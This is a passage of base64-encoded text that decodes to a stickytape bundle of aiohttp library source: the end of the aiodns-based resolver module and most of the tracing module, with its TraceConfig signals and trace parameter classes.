pbmdfbG9vcChsb29wKVxyXG4gICAgICAgIHNlbGYuX3Jlc29sdmVyID0gYWlvZG5zLkROU1Jlc29sdmVyKCphcmdzLCBsb29wPWxvb3AsICoqa3dhcmdzKVxyXG5cclxuICAgICAgICBpZiBub3QgaGFzYXR0cihzZWxmLl9yZXNvbHZlciwgImdldGhvc3RieW5hbWUiKTpcclxuICAgICAgICAgICAgIyBhaW9kbnMgMS4xIGlzIG5vdCBhdmFpbGFibGUsIGZhbGxiYWNrIHRvIEROU1Jlc29sdmVyLnF1ZXJ5XHJcbiAgICAgICAgICAgIHNlbGYucmVzb2x2ZSA9IHNlbGYuX3Jlc29sdmVfd2l0aF9xdWVyeSAgIyB0eXBlOiBpZ25vcmVcclxuXHJcbiAgICBhc3luYyBkZWYgcmVzb2x2ZShcclxuICAgICAgICBzZWxmLCBob3N0OiBzdHIsIHBvcnQ6IGludCA9IDAsIGZhbWlseTogaW50ID0gc29ja2V0LkFGX0lORVRcclxuICAgICkgLT4gTGlzdFtEaWN0W3N0ciwgQW55XV06XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByZXNwID0gYXdhaXQgc2VsZi5fcmVzb2x2ZXIuZ2V0aG9zdGJ5bmFtZShob3N0LCBmYW1pbHkpXHJcbiAgICAgICAgZXhjZXB0IGFpb2Rucy5lcnJvci5ETlNFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgIG1zZyA9IGV4Yy5hcmdzWzFdIGlmIGxlbihleGMuYXJncykgPj0gMSBlbHNlICJETlMgbG9va3VwIGZhaWxlZCJcclxuICAgICAgICAgICAgcmFpc2UgT1NFcnJvcihtc2cpIGZyb20gZXhjXHJcbiAgICAgICAgaG9zdHMgPSBbXVxyXG4gICAgICAgIGZvciBhZGRyZXNzIGluIHJlc3AuYWRkcmVzc2VzOlxyXG4gICAgICAgICAgICBob3N0cy5hcHBlbmQoXHJcbiAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgImhvc3RuYW1lIjogaG9zdCxcclxuICAgICAgICAgICAgICAgICAgICAiaG9zdCI6IGFkZHJlc3MsXHJcbiAgICAgICAgICAgICAgICAgICAgInBvcnQiOiBwb3J0LFxyXG4gICAgICAgICAgICAgICAgICAgICJmYW1pbHkiOiBmYW1pbHksXHJcbiAgICAgICAgICAgICAgICAgICAgInByb3RvIjogMCxcclxuICAgICAgICAgICAgICAgICAgICAiZmxhZ3MiOiBzb2NrZXQuQUlfTlVNRVJJQ0hPU1QgfCBzb2NrZXQuQUlfTlVNRVJJQ1NFUlYsXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IGhvc3RzOlxyXG4gICAgICAgICAgICByYWlzZSBPU0Vycm9yKCJETlMgbG9va3VwIGZhaWxlZCIpXHJcblxyXG4gICAgICAgIHJldHVybiBob3N0c1xyXG5cclxuICAgIGFzeW5jIGRlZiBfcmVzb2x2ZV93aXRoX3F1ZXJ5KFxyXG4gICAgICAgIHNlbGYsIGhvc3Q6IHN0ciwgcG9ydDogaW50ID0gMCwgZmFtaWx5OiBpbnQgPSBzb2NrZXQuQUZfSU5FVFxyXG4gICAgKSAtPiBMaXN0W0RpY3Rbc3RyLCBBbnldXTpcclxuICAgICAgICBpZiBmYW1pbHkgPT0gc29ja2V0LkFGX0lORVQ2OlxyXG4gICAgICAgICAgICBxdHlwZSA9ICJBQUFBIlxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHF0eXBlID0gIkEiXHJcblxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgcmVzcCA9IGF3YWl0IHNlbGYuX3Jlc29sdmVyLnF1ZXJ5KGhvc3QsIHF0eXBlKVxyXG4gICAgICAgIGV4Y2VwdCBhaW9kbnMuZXJyb3IuRE5TRXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICBtc2cgPSBleGMuYXJnc1sxXSBpZiBsZW4oZXhjLmFyZ3MpID49IDEgZWxzZSAiRE5TIGxvb2t1cCBmYWlsZWQiXHJcbiAgICAgICAgICAgIHJhaXNlIE9TRXJyb3IobXNnKSBmcm9tIGV4Y1xyXG5cclxuICAgICAgICBob3N0cyA9IFtdXHJcbiAgICAgICAgZm9yIHJyIGluIHJlc3A6XHJcbiAgICAgICAgICAgIGhvc3RzLmFwcGVuZChcclxuICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAiaG9zdG5hbWUiOiBob3N0LFxyXG4gICAgICAgICAgICAgICAgICAgICJob3N0IjogcnIuaG9zdCxcclxuICAgICAgICAgICAgICAgICAgICAicG9ydCI6IHBvcnQsXHJcbiAgICAgICAgICAgICAgICAgICAgImZhbWlseSI6IGZhbWlseSxcclxuICAgICAgICAgICAgICAgICAgICAicHJvdG8iOiAwLFxyXG4gICAgICAgICAgICAgICAgICAgICJmbGFncyI6IHNvY2tldC5BSV9OVU1FUklDSE9TVCxcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBub3QgaG9zdHM6XHJcbiAgICAgICAgICAgIHJhaXNlIE9TRXJyb3IoIkROUyBsb29rdXAgZmFpbGVkIilcclxuXHJcbiAgICAgICAgcmV0dXJuIGhvc3RzXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fcmVzb2x2ZXIuY2FuY2VsKClcclxuXHJcblxyXG5fRGVmYXVsdFR5cGUgPSBUeXBlW1VuaW9uW0FzeW5jUmVzb2x2ZXIsIFRocmVhZGVkUmVzb2x2ZXJdXVxyXG5EZWZhdWx0UmVzb2x2ZXI6IF9EZWZhdWx0VHlwZSA9IEFzeW5jUmVzb2x2ZXIgaWYgYWlvZG5zX2RlZmF1bHQgZWxzZSBUaHJlYWRlZFJlc29sdmVyXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL3RyYWNpbmcucHknLCBiJ2Zyb20gdHlwZXMgaW1wb3J0IFNpbXBsZU5hbWVzcGFjZVxyXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lORywgQXdhaXRhYmxlLCBPcHRpb25hbCwgVHlwZSwgVHlwZVZhclxyXG5cclxuaW1wb3J0IGF0dHJcclxuZnJvbSBhaW9zaWduYWwgaW1wb3J0IFNpZ25hbFxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3RcclxuZnJvbSB5YXJsIGltcG9ydCBVUkxcclxuXHJcbmZyb20gLmNsaWVudF9yZXFyZXAgaW1wb3J0IENsaWVudFJlc3BvbnNlXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC5jbGllbnQgaW1wb3J0IENsaWVudFNlc3Npb25cclxuICAgIGZyb20gLnR5cGVkZWZzIGltcG9ydCBQcm90b2NvbFxyXG5cclxuICAgIF9QYXJhbVRfY29udHJhID0gVHlwZVZhcigiX1BhcmFtVF9jb250cmEiLCBjb250cmF2YXJpYW50PVRydWUpXHJcblxyXG4gICAgY2xhc3MgX1NpZ25hbENhbGxiYWNrKFByb3RvY29sW19QYXJhbVRfY29udHJhXSk6XHJcbiAgICAgICAgZGVmIF9fY2FsbF9fKFxyXG4gICAgICAgICAgICBzZWxmLFxyXG4gICAgICAgICAgICBfX2NsaWVudF9zZXNzaW9uOiBDbGllbnRTZXNzaW9uLFxyXG4gICAgICAgICAgICBfX3RyYWNlX2NvbmZpZ19jdHg6IFNpbXBsZU5hbWVzcGFjZSxcclxuICAgICAgICAgICAgX19wYXJhbXM6IF9QYXJhbVRfY29udHJhLFxyXG4gICAgICAgICkgLT4gQXdhaXRhYmxlW05vbmVdOlxyXG4gICAgICAgICAgICAuLi5cclxuXHJcblxyXG5fX2FsbF9fID0gKFxyXG4gICAgIlRyYWNlQ29uZmlnIixcclxuICAgICJUcmFjZVJlcXVlc3RTdGFydFBhcmFtcyIsXHJcbiAgICAiVHJhY2VSZXF1ZXN0RW5kUGFyYW1zIixcclxuICAgICJUcmFjZVJlcXVlc3RFeGNlcHRpb25QYXJhbXMiLFxyXG4gICAgIlRyYWNlQ29ubmVjdGlvblF1ZXVlZFN0YXJ0UGFyYW1zIixcclxuICAgICJUcmFjZUNvbm5lY3Rpb25RdWV1ZWRFbmRQYXJhbXMiLFxyXG4gICAgIlRyYWNlQ29ubmVjdGlvbkNyZWF0ZVN0YXJ0UGFyYW1zIixcclxuICAgICJUcmFjZUNvbm5lY3Rpb25DcmVhdGVFbmRQYXJhbXMiLFxyXG4gICAgIlRyYWNlQ29ubmVjdGlvblJldXNlY29ublBhcmFtcyIsXHJcbiAgICAiVHJhY2VEbnNSZXNvbHZlSG9zdFN0YXJ0UGFyYW1zIixcclxuICAgICJUcmFjZURuc1Jlc29sdmVIb3N0RW5kUGFyYW1zIixcclxuICAgICJUcmFjZURuc0NhY2hlSGl0UGFyYW1zIixcclxuICAgICJUcmFjZURuc0NhY2hlTWlzc1BhcmFtcyIsXHJcbiAgICAiVHJhY2VSZXF1ZXN0UmVkaXJlY3RQYXJhbXMiLFxyXG4gICAgIlRyYWNlUmVxdWVzdENodW5rU2VudFBhcmFtcyIsXHJcbiAgICAiVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXMiLFxyXG4gICAgIlRyYWNlUmVxdWVzdEhlYWRlcnNTZW50UGFyYW1zIixcclxuKVxyXG5cclxuXHJcbmNsYXNzIFRyYWNlQ29uZmlnOlxyXG4gICAgIiIiRmlyc3QtY2xhc3MgdXNlZCB0byB0cmFjZSByZXF1ZXN0cyBsYXVuY2hlZCB2aWEgQ2xpZW50U2Vzc2lvbiBvYmplY3RzLiIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCB0cmFjZV9jb25maWdfY3R4X2ZhY3Rvcnk6IFR5cGVbU2ltcGxlTmFtZXNwYWNlXSA9IFNpbXBsZU5hbWVzcGFjZVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX29uX3JlcXVlc3Rfc3RhcnQgPSBTaWduYWwoXHJcbiAgICAgICAgICAgIHNlbGZcclxuICAgICAgICApICAjIHR5cGU6IFNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VSZXF1ZXN0U3RhcnRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX3JlcXVlc3RfY2h1bmtfc2VudCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZVJlcXVlc3RDaHVua1NlbnRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX3Jlc3BvbnNlX2NodW5rX3JlY2VpdmVkID0gU2lnbmFsKFxyXG4gICAgICAgICAgICBzZWxmXHJcbiAgICAgICAgKSAgIyB0eXBlOiBTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVzcG9uc2VDaHVua1JlY2VpdmVkUGFyYW1zXV1cclxuICAgICAgICBzZWxmLl9vbl9yZXF1ZXN0X2VuZCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZVJlcXVlc3RFbmRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX3JlcXVlc3RfZXhjZXB0aW9uID0gU2lnbmFsKFxyXG4gICAgICAgICAgICBzZWxmXHJcbiAgICAgICAgKSAgIyB0eXBlOiBTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdEV4Y2VwdGlvblBhcmFtc11dXHJcbiAgICAgICAgc2VsZi5fb25fcmVxdWVzdF9yZWRpcmVjdCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZVJlcXVlc3RSZWRpcmVjdFBhcmFtc11dXHJcbiAgICAgICAgc2VsZi5fb25fY29ubmVjdGlvbl9xdWV1ZWRfc3RhcnQgPSBTaWduYWwoXHJcbiAgICAgICAgICAgIHNlbGZcclxuICAgICAgICApICAjIHR5cGU6IFNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VDb25uZWN0aW9uUXVldWVkU3RhcnRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX2Nvbm5lY3Rpb25fcXVldWVkX2VuZCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZUNvbm5lY3Rpb25RdWV1ZWRFbmRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX2Nvbm5lY3Rpb25fY3JlYXRlX3N0YXJ0ID0gU2lnbmFsKFxyXG4gICAgICAgICAgICBzZWxmXHJcbiAgICAgICAgKSAgIyB0eXBlOiBTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlQ29ubmVjdGlvbkNyZWF0ZVN0YXJ0UGFyYW1zXV1cclxuICAgICAgICBzZWxmLl9vbl9jb25uZWN0aW9uX2NyZWF0ZV9lbmQgPSBTaWduYWwoXHJcbiAgICAgICAgICAgIHNlbGZcclxuICAgICAgICApICAjIHR5cGU6IFNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VDb25uZWN0aW9uQ3JlYXRlRW5kUGFyYW1zXV1cclxuICAgICAgICBzZWxmLl9vbl9jb25uZWN0aW9uX3JldXNlY29ubiA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZUNvbm5lY3Rpb25SZXVzZWNvbm5QYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX2Ruc19yZXNvbHZlaG9zdF9zdGFydCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZURuc1Jlc29sdmVIb3N0U3RhcnRQYXJhbXNdXVxyXG4gICAgICAgIHNlbGYuX29uX2Ruc19yZXNvbHZlaG9zdF9lbmQgPSBTaWduYWwoXHJcbiAgICAgICAgICAgIHNlbGZcclxuICAgICAgICApICAjIHR5cGU6IFNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VEbnNSZXNvbHZlSG9zdEVuZFBhcmFtc11dXHJcbiAgICAgICAgc2VsZi5fb25fZG5zX2NhY2hlX2hpdCA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZURuc0NhY2hlSGl0UGFyYW1zXV1cclxuICAgICAgICBzZWxmLl9vbl9kbnNfY2FjaGVfbWlzcyA9IFNpZ25hbChcclxuICAgICAgICAgICAgc2VsZlxyXG4gICAgICAgICkgICMgdHlwZTogU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZURuc0NhY2hlTWlzc1BhcmFtc11dXHJcbiAgICAgICAgc2VsZi5fb25fcmVxdWVzdF9oZWFkZXJzX3NlbnQgPSBTaWduYWwoXHJcbiAgICAgICAgICAgIHNlbGZcclxuICAgICAgICApICAjIHR5cGU6IFNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VSZXF1ZXN0SGVhZGVyc1NlbnRQYXJhbXNdXVxyXG5cclxuICAgICAgICBzZWxmLl90cmFjZV9jb25maWdfY3R4X2ZhY3RvcnkgPSB0cmFjZV9jb25maWdfY3R4X2ZhY3RvcnlcclxuXHJcbiAgICBkZWYgdHJhY2VfY29uZmlnX2N0eChcclxuICAgICAgICBzZWxmLCB0cmFjZV9yZXF1ZXN0X2N0eDogT3B0aW9uYWxbU2ltcGxlTmFtZXNwYWNlXSA9IE5vbmVcclxuICAgICkgLT4gU2ltcGxlTmFtZXNwYWNlOlxyXG4gICAgICAgICIiIlJldHVybiBhIG5ldyB0cmFjZV9jb25maWdfY3R4IGluc3RhbmNlIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3RyYWNlX2NvbmZpZ19jdHhfZmFjdG9yeSh0cmFjZV9yZXF1ZXN0X2N0eD10cmFjZV9yZXF1ZXN0X2N0eClcclxuXHJcbiAgICBkZWYgZnJlZXplKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fb25fcmVxdWVzdF9zdGFydC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX3JlcXVlc3RfY2h1bmtfc2VudC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX3Jlc3BvbnNlX2NodW5rX3JlY2VpdmVkLmZyZWV6ZSgpXHJcbiAgICAgICAgc2VsZi5fb25fcmVxdWVzdF9lbmQuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9vbl9yZXF1ZXN0X2V4Y2VwdGlvbi5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX3JlcXVlc3RfcmVkaXJlY3QuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9vbl9jb25uZWN0aW9uX3F1ZXVlZF9zdGFydC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX2Nvbm5lY3Rpb25fcXVldWVkX2VuZC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX2Nvbm5lY3Rpb25fY3JlYXRlX3N0YXJ0LmZyZWV6ZSgpXHJcbiAgICAgICAgc2VsZi5fb25fY29ubmVjdGlvbl9jcmVhdGVfZW5kLmZyZWV6ZSgpXHJcbiAgICAgICAgc2VsZi5fb25fY29ubmVjdGlvbl9yZXVzZWNvbm4uZnJlZXplKClcclxuICAgICAgICBzZWxmLl9vbl9kbnNfcmVzb2x2ZWhvc3Rfc3RhcnQuZnJlZXplKClcclxuICAgICAgICBzZWxmLl9vbl9kbnNfcmVzb2x2ZWhvc3RfZW5kLmZyZWV6ZSgpXHJcbiAgICAgICAgc2VsZi5fb25fZG5zX2NhY2hlX2hpdC5mcmVlemUoKVxyXG4gICAgICAgIHNlbGYuX29uX2Ruc19jYWNoZV9taXNzLmZyZWV6ZSgpXHJcbiAgICAgICAgc2VsZi5fb25fcmVxdWVzdF9oZWFkZXJzX3NlbnQuZnJlZXplKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvbl9yZXF1ZXN0X3N0YXJ0KHNlbGYpIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdFN0YXJ0UGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9yZXF1ZXN0X3N0YXJ0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fcmVxdWVzdF9jaHVua19zZW50KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdENodW5rU2VudFBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fcmVxdWVzdF9jaHVua19zZW50XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fcmVzcG9uc2VfY2h1bmtfcmVjZWl2ZWQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXNdXSI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29uX3Jlc3BvbnNlX2NodW5rX3JlY2VpdmVkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fcmVxdWVzdF9lbmQoc2VsZikgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VSZXF1ZXN0RW5kUGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9yZXF1ZXN0X2VuZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX3JlcXVlc3RfZXhjZXB0aW9uKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdEV4Y2VwdGlvblBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fcmVxdWVzdF9leGNlcHRpb25cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvbl9yZXF1ZXN0X3JlZGlyZWN0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdFJlZGlyZWN0UGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9yZXF1ZXN0X3JlZGlyZWN0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY29ubmVjdGlvbl9xdWV1ZWRfc3RhcnQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VDb25uZWN0aW9uUXVldWVkU3RhcnRQYXJhbXNdXSI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29uX2Nvbm5lY3Rpb25fcXVldWVkX3N0YXJ0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY29ubmVjdGlvbl9xdWV1ZWRfZW5kKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlQ29ubmVjdGlvblF1ZXVlZEVuZFBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fY29ubmVjdGlvbl9xdWV1ZWRfZW5kXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY29ubmVjdGlvbl9jcmVhdGVfc3RhcnQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VDb25uZWN0aW9uQ3JlYXRlU3RhcnRQYXJhbXNdXSI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29uX2Nvbm5lY3Rpb25fY3JlYXRlX3N0YXJ0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY29ubmVjdGlvbl9jcmVhdGVfZW5kKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlQ29ubmVjdGlvbkNyZWF0ZUVuZFBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fY29ubmVjdGlvbl9jcmVhdGVfZW5kXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25fY29ubmVjdGlvbl9yZXVzZWNvbm4oXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VDb25uZWN0aW9uUmV1c2Vjb25uUGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9jb25uZWN0aW9uX3JldXNlY29ublxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX2Ruc19yZXNvbHZlaG9zdF9zdGFydChcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiAiU2lnbmFsW19TaWduYWxDYWxsYmFja1tUcmFjZURuc1Jlc29sdmVIb3N0U3RhcnRQYXJhbXNdXSI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29uX2Ruc19yZXNvbHZlaG9zdF9zdGFydFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX2Ruc19yZXNvbHZlaG9zdF9lbmQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VEbnNSZXNvbHZlSG9zdEVuZFBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fZG5zX3Jlc29sdmVob3N0X2VuZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX2Ruc19jYWNoZV9oaXQoc2VsZikgLT4gIlNpZ25hbFtfU2lnbmFsQ2FsbGJhY2tbVHJhY2VEbnNDYWNoZUhpdFBhcmFtc11dIjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25fZG5zX2NhY2hlX2hpdFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX2Ruc19jYWNoZV9taXNzKHNlbGYpIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlRG5zQ2FjaGVNaXNzUGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9kbnNfY2FjaGVfbWlzc1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG9uX3JlcXVlc3RfaGVhZGVyc19zZW50KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+ICJTaWduYWxbX1NpZ25hbENhbGxiYWNrW1RyYWNlUmVxdWVzdEhlYWRlcnNTZW50UGFyYW1zXV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbl9yZXF1ZXN0X2hlYWRlcnNfc2VudFxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBUcmFjZVJlcXVlc3RTdGFydFBhcmFtczpcclxuICAgICIiIlBhcmFtZXRlcnMgc2VudCBieSB0aGUgYG9uX3JlcXVlc3Rfc3RhcnRgIHNpZ25hbCIiIlxyXG5cclxuICAgIG1ldGhvZDogc3RyXHJcbiAgICB1cmw6IFVSTFxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFRyYWNlUmVxdWVzdENodW5rU2VudFBhcmFtczpcclxuICAgICIiIlBhcmFtZXRlcnMgc2VudCBieSB0aGUgYG9uX3JlcXVlc3RfY2h1bmtfc2VudGAgc2lnbmFsIiIiXHJcblxyXG4gICAgbWV0aG9kOiBzdHJcclxuICAgIHVybDogVVJMXHJcbiAgICBjaHVuazogYnl0ZXNcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9yZXNwb25zZV9jaHVua19yZWNlaXZlZGAgc2lnbmFsIiIiXHJcblxyXG4gICAgbWV0aG9kOiBzdHJcclxuICAgIHVybDogVVJMXHJcbiAgICBjaHVuazogYnl0ZXNcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VSZXF1ZXN0RW5kUGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fcmVxdWVzdF9lbmRgIHNpZ25hbCIiIlxyXG5cclxuICAgIG1ldGhvZDogc3RyXHJcbiAgICB1cmw6IFVSTFxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcbiAgICByZXNwb25zZTogQ2xpZW50UmVzcG9uc2VcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VSZXF1ZXN0RXhjZXB0aW9uUGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fcmVxdWVzdF9leGNlcHRpb25gIHNpZ25hbCIiIlxyXG5cclxuICAgIG1ldGhvZDogc3RyXHJcbiAgICB1cmw6IFVSTFxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcbiAgICBleGNlcHRpb246IEJhc2VFeGNlcHRpb25cclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VSZXF1ZXN0UmVkaXJlY3RQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9yZXF1ZXN0X3JlZGlyZWN0YCBzaWduYWwiIiJcclxuXHJcbiAgICBtZXRob2Q6IHN0clxyXG4gICAgdXJsOiBVUkxcclxuICAgIGhlYWRlcnM6ICJDSU11bHRpRGljdFtzdHJdIlxyXG4gICAgcmVzc